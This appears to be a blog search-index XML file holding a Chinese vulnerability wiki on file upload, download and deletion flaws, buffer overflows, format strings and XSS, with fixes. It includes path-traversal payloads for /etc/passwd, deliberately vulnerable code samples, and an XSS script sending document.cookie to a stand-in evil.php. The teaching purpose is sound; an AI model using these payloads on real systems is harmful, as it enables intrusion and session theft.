<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>漏洞安全知识Wiki</title>
      <link href="/2021/06/08/lou-dong-an-quan-zhi-shi-wiki.htm"/>
      <url>/2021/06/08/lou-dong-an-quan-zhi-shi-wiki.htm</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞安全知识Wiki"><a href="#漏洞安全知识Wiki" class="headerlink" title="漏洞安全知识Wiki"></a>漏洞安全知识Wiki</h1><blockquote><p>本文从漏洞类型的维度进行知识体系的整理，包含了漏洞介绍、漏洞危害、攻击案例、检测方法、解决方案的内容，部分漏洞类型从代码层了解此类漏洞原理及修复方法。持续更新。</p></blockquote><span id="more"></span><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p><strong>漏洞描述</strong></p><ul><li>文件上传漏洞通常由于网页代码中的文件上传路径变量过滤不严或<code>Webserver</code>相关解析漏洞未修复而造成的，如果文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，攻击者可通过<code> Web</code> 访问的目录上传任意文件，包括网站后门文件（<code>Webshell</code>），进而远程控制网站服务器。</li></ul><p><strong>漏洞危害</strong></p><ul><li>非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为<code>Webshell</code>，也可将<code>Webshell</code>脚本称为一种网页后门，<code>Webshell</code>脚本具有非常强大的功能，比如查看服务器目录、。服务器中的文件，执行系统命令等。 </li></ul><p><strong>攻击案例</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 定义图片所在的目标位置</span><span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 上传的文件将被保存。</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string">"pictures/"</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 将上传的文件移动到新位置。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token keyword">echo</span> <span class="token string">"The picture has been successfully uploaded."</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token keyword">echo</span> <span class="token string">"There was an error uploading the picture, please try again."</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>对应用平台的攻击</strong></em></p><ul><li>将<code>.jsp</code>文件上传到<code>Web tree</code>——以<code>Web</code>用户身份执行的<code>JSP</code>代码</li><li>上传<code>.gif</code>文件以重新调整大小——利用图片库漏洞</li><li>上传大文件——文件空间拒绝服务</li><li>使用恶意路径或名称上传文件——覆盖关键文件</li><li>上载包含个人数据的文件——其他用户可以访问它</li><li>上载包含“标签”的文件——标签被执行为“包含”在网页中的一部分</li><li>上载要由防病毒软件扫描的<code>.rar</code>文件——在运行易受攻击的防病毒软件的服务器上执行的命令</li></ul><p><strong>检测方法</strong></p><ul><li><p>检测前端代码可以通过<code>JS</code>禁用，尝试上传其他后缀名格式的文件看是否上传成功；</p></li><li><p>检测<code>content-type</code>，通过修改<code>content-type</code>的文件类型尝试上传目标格式文件；</p></li><li><p>检测文件头判断文件类型，通过使用常见的文件头的hex编码来确认文件类型；</p></li><li><p>检测目标是否存在<code>IIS</code>解析漏洞，假设上传一个名为<code>&quot;test.asp;xxx.jpg&quot;</code>时，该文件会被当做<code>asp</code>文件解析；</p></li><li><p>检测目标是否有<code>Apache</code>解析漏洞，检测目标是否可以使用<code>%00</code>截断等；</p></li></ul><p><strong>修复建议</strong></p><ul><li><p>对上传文件类型进行限制，并且不能只做前端的限制，而要前端和后端一起限制，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小，或是将上传的文件放在安全的路径下，尽量放于Web server之外的远程服务器等。</p></li><li><p>严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关目录的执行权限，防范Webshell攻击。</p></li><li><p>对上传文件格式进行严格校验及安全扫描，防止上传恶意脚本文件；</p></li><li><p>设置权限限制，禁止上传目录的执行权限；</p></li><li><p>严格限制可上传的文件类型；</p></li><li><p>严格限制上传的文件路径。</p></li><li><p>文件扩展名服务端白名单校验。</p></li><li><p>文件内容服务端校验。</p></li><li><p>上传文件重命名。</p></li><li><p>隐藏上传文件路径。</p></li></ul><h3 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h3><p><strong>漏洞描述</strong></p><ul><li>某些网站可能因为业务需要，提供文件查看或者下载的功能，如果对用户查看或者需要下载的文件不做限制，那么一些攻击者可能构造恶意代码下载网站的敏感文件（源代码，数据库文件，登录密码等）。</li></ul><p><strong>漏洞危害</strong></p><ul><li><p>可以下载目标服务器的任意文件，如网站源码、网站配置文件、系统配置文件等。</p></li><li><p>通过获取的源码进行代码审计，进一步获得可利用的漏洞。</p></li></ul><p><strong>攻击案例</strong></p><p>场景1：用<code>header()</code>下载：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"uploads/abc.jpg"</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: imgage/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition: attachment; filename='</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Lengh: '</span><span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    Payload：</p><pre class="line-numbers language-php"><code class="language-php">vul<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwdvul<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>检测方法</strong></p><pre class="line-numbers language-http"><code class="language-http">../探测：download.php?filename=aa/../xxx.doc ../../../../etc/passwddownload.php?f=ﬁle:///etc/passwddownload.php?f=../ download.php检测以下url参数：&amp;RealPath=&amp;FilePath=&amp;filepath=&amp;Path=&amp;path=&amp;inputFile=&amp;url=&amp;Lang=&amp;dis=&amp;data=&amp;readfile=&amp;src  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>修复建议</strong></p><ul><li><p>对下载路径进行过滤，如下载前对传入的参数进行过滤，并且对下载文件类型进行检查，是否是允许下载的类型，另外禁止使用回溯符<code>../</code> ； </p></li><li><p>正则严格判断用户输入参数的格式；</p></li><li><p><code>php.ini</code>配置<code>open_basedir</code>限定文件访问范围</p></li></ul><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p><strong>漏洞描述</strong></p><ul><li>未经授权访问者可以进行删除文件、附件、图片、替换、配置等。</li></ul><p><strong>漏洞危害</strong></p><ul><li>攻击者利用此漏洞可直接删除Web目录甚至服务器上任意格式文件，直接导致业务系统中断、崩溃。</li></ul><p><strong>攻击案例</strong></p><p>场景1：存在任意文件删除的代码示例：构造服务器上已有文件或文件夹<code>payload</code>，即可删除目标服务器的文件或文件夹。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> function <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                   $dir <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>input<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_post</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span>$dir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                            <span class="token function">getjson</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string">'plub_11'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>                   $dirs <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span>$dir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                            $dirs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> $dir<span class="token punctuation">;</span>                   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                            $dirs <span class="token operator">=</span> $dir<span class="token punctuation">;</span>                   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>                   <span class="token function">foreach</span><span class="token punctuation">(</span>$dirs as $dir<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token function">deldir</span><span class="token punctuation">(</span>FCPATH<span class="token punctuation">.</span><span class="token string">'attachment/backup/'</span><span class="token punctuation">.</span>$dir<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>                   $info<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">L</span><span class="token punctuation">(</span><span class="token string">'plub_12'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   $info<span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">site_url</span><span class="token punctuation">(</span><span class="token string">'basedb/restore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'?v='</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">getjson</span><span class="token punctuation">(</span>$info<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检测方法</strong></p><ul><li>判断代码里是否有进行删除操作的函数，对提交的参数进行简单的判断，然后在输入的参数拼接服务器上已有测试文件的目录，删除成功则表示目标存在任意文件删除漏洞。</li></ul><p><strong>修复建议</strong></p><ul><li><p>限制文件删除函数可删除的目录位置以及文件类型</p></li><li><p>文件名非用户可控</p></li><li><p>禁止使用回溯符<code>../</code> </p></li></ul><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p><strong>漏洞描述</strong></p><ul><li>缓冲区溢出错误的特征是覆盖了进程的内存片段，这些内存片段永远不要有意或无意地修改。IP（指令指针），BP（基本指针）和其他寄存器的值覆盖会导致异常，分段错误和其他错误发生。通常，这些错误会以意外的方式终止应用程序的执行。当我们对char类型的缓冲区进行操作时，会发生缓冲区溢出错误。缓冲区溢出可以包括溢出堆栈（堆栈溢出）或溢出堆（堆溢出）。</li></ul><p><strong>漏洞危害</strong></p><ul><li><p>缓冲区溢出通常会导致崩溃。导致缺乏可用性的其他攻击也是可能的，包括将程序置于无限循环中。</p></li><li><p>缓冲区溢出可用于执行任意代码，这通常超出程序隐式安全策略的范围。</p></li><li><p>当后果是执行任意代码时，通常可以使用它来颠覆任何其他安全服务。</p></li></ul><p><strong>攻击案例</strong></p><ul><li>场景1：缓冲区大小是固定的，但不能保证<code>argv [1]</code>中的字符串不会超过该大小并引起溢出。</li></ul><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> BUFSIZE 256</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检测方法</strong></p><ul><li><p>在检查代码中是否存在堆栈溢出时，建议搜索对不安全的库函数（如<code>gets()</code>，<code>strcpy()</code>，<code>strcat()</code>等）的调用，这些函数不会验证源字符串的长度，并盲目地将数据复制到固定大小的缓冲区中。</p></li><li><p>当将可变大小的数据复制到位于程序堆栈上的固定长度缓冲区而不进行任何边界检查时，就会发生堆栈溢出。</p></li></ul><p><code>OWASP</code>检测方案：</p><ul><li><p><a href="https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.2-Testing_for_Stack_Overflow.html">https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.2-Testing_for_Stack_Overflow.html</a></p></li><li><p><a href="https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.1-Testing_for_Heap_Overflow.html">https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.1-Testing_for_Heap_Overflow.html</a></p></li></ul><p><strong>修复建议</strong></p><ul><li>不使用<code>strcpy()</code>、<code>sprintf()</code>等不安全的函数，而要在<code>strncpy()</code>、<code>memcpy()</code>、<code>snprinf()</code>的基础上封装出安全的函数，对<code>copy</code>进<code>buffer</code>的内容大小进行限制，超过大小则截断。</li></ul><h3 id="空指针漏洞"><a href="#空指针漏洞" class="headerlink" title="空指针漏洞"></a>空指针漏洞</h3><p><strong>漏洞描述</strong></p><ul><li><code>Null Pointer</code>空指针的引用，对于空指针的错误引用往往是由于在引用之前没有对空指针做判断，就直接使用空指针，还有可能把空指针作为一个对象来使用，间接使用对象中的属性或是方法，而引起程序崩溃，空指针的错误使用常见于系统、服务、软件漏洞方面。当应用程序取消引用它期望是有效的但为<code>NULL</code>的指针时，就会发生NULL指针取消引用，通常会导致崩溃或退出。</li></ul><p><strong>漏洞危害</strong></p><ul><li><p>造成程序的崩溃，退出或重新启动。</p></li><li><p>执行未经授权的代码或命令；读取内存；修改内存。</p></li><li><p>在极少数情况下，当NULL等于0x0内存地址并且特权代码可以访问它时，就可以写入或读取内存，这可能导致代码执行。</p></li></ul><p><strong>攻击案例</strong></p><p>场景1：以下步骤将确保程序不发生空指针取消引用。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>pointer1 <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* make use of pointer1 */</span><span class="token comment" spellcheck="true">/* ... */</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>场景2：在以下代码中，程序员假定系统始终定义了名为“<code>cmd</code>”的属性。如果攻击者可以控制程序的环境，从而未定义“<code>cmd</code>”，则当程序尝试调用<code>trim()</code>方法时，该程序将引发NULL指针异常。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Example Language: Java </span>String cmd <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检测方法</strong></p><ul><li><p>自动化动态分析：可以使用动态工具和技术来检测到此弱点，这些工具和技术可以使用具有大量不同输入的大型测试套件与软件进行交互，例如模糊测试（<code>fuzzing</code>），稳定性测试和故障注入。该应用程序的操作可能会变慢，但不应变得不稳定，崩溃或产生错误的结果。</p></li><li><p>手动动态分析：确定正常使用期间不太可能发生的错误情况并触发它们。例如，在内存不足的情况下运行该程序，没有足够的特权或权限运行该程序，在进程完成之前中断该进程，或禁用与基本网络服务（例如<code>DNS</code>）的连接，监控应用程序是否有意外错误行为。如果您触发了未处理的异常或由应用程序的环境发现并处理的类似错误，则它可能仍指示应用程序本身未处理的意外情况。</p></li></ul><p><strong>修复建议</strong></p><ul><li><p>如果在使用之前对所有可能已修改的指针进行了完整性检查，则可以防止几乎所有的<code>NULL</code>指针取消引用。</p></li><li><p>在返回值之前，请检查所有返回值的函数的结果，并验证该值是否为非空值。</p></li><li><p>识别所有从外部来源接收信息的变量和数据存储，并应用输入验证以确保它们仅被初始化为期望值。</p></li><li><p>在声明过程中或在第一次使用之前，显式初始化所有变量和其他数据存储。</p></li></ul><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p><strong>漏洞描述</strong></p><p>当应用程序将输入字符串的提交数据作为命令评估时，就会发生Format String攻击。通过这种方式，攻击者可以执行代码，读取堆栈或在正在运行的应用程序中引起分段错误，从而导致可能损害系统安全性或稳定性的新行为。</p><p><strong>漏洞危害</strong></p><ul><li><p>如果服务器端代码将用户输入与格式字符串连接在一起，则攻击者可能会附加其他转换说明符，从而导致运行时错误，信息泄露或缓冲区溢出。</p></li><li><p>如果攻击者通过修改格式字符串来利用这些功能，则可能导致信息泄露和代码执行。</p></li><li><p>攻击成功可能造成修改数据、读取数据、获得权限、远程命令执行。 </p></li></ul><p><strong>攻击案例</strong></p><p>场景1: 导致格式字符串漏洞的代码模式是对包含未经处理的用户输入的字符串格式函数的调用。以下示例显示了调试如何printf使程序易受攻击：</p><ul><li><code>C</code>中的示例：</li></ul><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>userName <span class="token operator">=</span> <span class="token comment" spellcheck="true">/* input from user controlled field */</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DEBUG Current user: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//存在漏洞的调试代码</span><span class="token function">printf</span><span class="token punctuation">(</span>userName<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>Java</code>中的示例：</li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">final</span> String userName <span class="token operator">=</span> <span class="token comment" spellcheck="true">/* input from user controlled field */</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DEBUG Current user: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 存在漏洞的代码:</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>userName<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在此特定示例中，如果攻击者将其设置<code>userName</code>为具有一个或多个转换说明符，则将出现有害的行为。<code>C</code>示例将打印出内存内容（如果<code>userName</code>包含）<code>%p%p%p%p%p</code>，并且如果<code>%n</code>字符串中有<code>a </code>，它可能会破坏内存内容。在<code>Java</code>示例中，<code>username</code>包含任何需要输入（包括%x或%s）的说明符的都会导致导致程序崩溃<code>IllegalFormatException</code>。尽管示例仍然存在其他问题，但是可以通过使用<code>printf</code>参数修复该漏洞<code>printf(&quot;DEBUG Current user: %s&quot;, userName)</code>。</li></ul><p><strong>检测方法</strong></p><ul><li><p>存在漏洞的先决条件：目标应用程序必须接受字符串作为用户输入，无法清理用户输入中的字符串格式字符，并使用解释字符串格式字符的函数来处理此字符串。</p></li><li><p>静态分析工具可以在代码或二进制文件中找到格式字符串漏洞。工具示例包括：</p><p><code>C</code>和<code>C ++</code>：<code>Flawfinder</code></p><p><code>Java</code>：<code>FindSecurityBugs</code>规则<code>FORMAT_STRING_MANIPULATION</code></p><p><code>PHP</code>：<code>phpsa</code>中的字符串格式分析器</p></li><li><p>手动代码检查：静态分析可能会错过更复杂的情况，包括复杂代码生成的格式字符串。要在代码库中手动查找漏洞，测试人员可以在代码库中查找所有接受格式字符串的调用，然后回溯以确保不受信任的输入无法更改格式字符串。</p></li><li><p>手动注入：测试人员可以使用Web浏览器或其他Web API调试工具执行手动测试。浏览到Web应用程序或网站，以使查询具有转换说明符。请注意，如果大多数转换说明符在URL中发送，则需要进行编码，因为它们包含特殊字符，包括%和{。该测试可以<code>%s%s%s%n</code>通过使用以下URL浏览来引入说明符字符串：</p></li></ul><pre class="line-numbers language-http"><code class="language-http">    https://vulnerable_host/userinfo?username=%25s%25s%25s%25n  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    如果网站容易受到攻击，则浏览器或工具应收到错误消息，其中可能包括超时或HTTP返回码500。</p><p>​    <code>Java</code>代码返回错误</p><pre class="line-numbers language-java"><code class="language-java">    java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>MissingFormatArgumentException<span class="token operator">:</span>  Format specifier <span class="token string">'%s'</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code> 根据`C`的实现，该过程可能会完全崩溃`Segmentation Fault`。</code></pre><p><strong>修复建议</strong></p><ul><li><p>限制格式化字符串函数的使用。</p></li><li><p>输入验证：必须对所有用户可控制的输入进行验证并过滤掉非法格式字符。</p></li></ul><h3 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h3><p><strong>漏洞描述</strong></p><ul><li><p>跨站脚本攻击（<code>Cross-site scripting</code>，简称<code>XSS</code>攻击），通常发生在客户端，可被用于进行隐私窃取、钓鱼欺骗、密码偷取、恶意代码传播等攻击行为。<code>XSS</code>攻击使用到的技术主要为<code>HTML</code>和<code>Javascript</code>脚本，也包括<code>VBScript</code>和<code>ActionScript</code>脚本等。</p></li><li><p>恶意攻击者将对客户端有危害的代码放到服务器上作为一个网页内容，用户不经意打开此网页时，这些恶意代码会注入到用户的浏览器中并执行，从而使用户受到攻击。一般而言，利用跨站脚本攻击，攻击者可窃取会话<code>cookie</code>，从而获得用户的隐私信息，甚至包括密码等敏感信息。</p></li><li><p>存在三种<code>XSS</code>类型，通常针对用户的浏览器：</p><p>反射式<code>XSS</code>：应用程序或<code>API</code>包括未经验证和未经转义的用户输入，作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的<code>HTML</code>和<code>JavaScript</code>。 通常，用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，广告或类似内容。</p><p>存储式<code>XSS</code>：你的应用或者<code>API</code>将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。 存储型<code>XSS</code>一般被认为是高危或严重的风险。</p><p>基于<code>DOM</code>的<code>XSS</code>：会动态的将攻击者可控的内容加入页面的<code>JavaScript</code>框架、单页面程序或<code>API</code>存在这种类型的漏洞。理想的来说，你应该避免将攻击者可控的数据发送给不安全的<code>JavaScript API</code>。</p></li><li><p>典型的<code>XSS</code>攻击可导致盗取<code>session</code>、账户、绕过<code>MFA</code>、<code>DIV</code>替换、对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其他用户侧的攻击。</p></li></ul><p><strong>漏洞危害</strong></p><ul><li><p>网络钓鱼，包括盗取各类用户账号</p></li><li><p>窃取用户<code>cookie</code>资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作</p></li><li><p>劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账，强制发表日志，发送电子邮件等</p></li><li><p>强制弹出广告页面，刷流量等</p></li><li><p>网页挂马</p></li><li><p>进行恶意操作，例如任意篡改页面信息，删除文章等</p></li><li><p>进行大量的客户端攻击，如<code>DDOS</code>攻击</p></li><li><p>获取客户端信息，例如用户的浏览历史，真实<code>ip</code>，开放端口等</p></li><li><p>控制受害者机器向其他网站发起攻击</p></li><li><p>结合其他漏洞进一步扩大攻击</p></li><li><p>提升用户权限，包括进一步渗透网站</p></li><li><p>传播<code>XSS</code>跨站脚本蠕虫等</p></li></ul><p><strong>攻击案例</strong></p><p>场景1：以下<code>JSP</code>代码段从HTTP请求读取员工<code>ID eid</code>，并将其显示给用户。</p><pre class="line-numbers language-jsp"><code class="language-jsp"><% String eid = request.getParameter("eid"); %>... Employee ID: <%= eid %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果<code>eid</code>仅包含标准字母数字文本，则此示例中的代码将正确运行。如果<code>eid</code>的值包含元字符或源代码，则该代码将由<code>Web</code>浏览器执行，因为它显示<code>HTTP</code>响应。</p><p>场景2：获取目标用户<code>Cookie</code></p><p>如果应用程序不验证输入数据，则攻击者可以轻松地从经过身份验证的用户那里窃取cookie。攻击者所需要做的就是将以下代码放置在任何张贴的输入中（即：留言板，私人消息，用户个人资料）：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>SCRIPT type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">var</span> adr <span class="token operator">=</span> <span class="token string">'../evil.php?cakemonster='</span> <span class="token operator">+</span> <span class="token function">escape</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRIPT<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上面的代码会将<code>cookie</code>的转义内容（根据<code>RFC</code>内容必须先转义，然后才通过<code>GET</code>方法通过<code>HTTP</code>协议将其发送）传递给“<code>cakemonster</code>”变量中的<code>evil.php</code>脚本。攻击者然后检查其<code>evil.php</code>脚本的结果（<code>cookie</code>抓取程序脚本通常会将<code>cookie</code>写入文件）并使用它。</p><p><strong>检测方法</strong></p><p><code>XSS</code>常见测试语句：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>xss<span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token 